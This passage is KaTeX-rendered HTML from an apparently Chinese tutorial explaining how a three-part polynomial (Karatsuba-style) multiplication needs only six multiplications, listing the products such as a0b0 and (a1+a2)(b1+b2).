class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mord\">+</span></span></span><span style=\"top:-1.59973em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">[</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord\">+</span></span></span><span style=\"top:-0.0997300000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">[</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord\">+</span></span></span><span style=\"top:1.40027em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.06027em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>可以看到只需要进行 6 次乘法：</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">a_0b_0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">a_1b_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">a_2b_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(a_1+a_2)(b_1+b_2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(a_0+a_2)(b_0+b_2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span 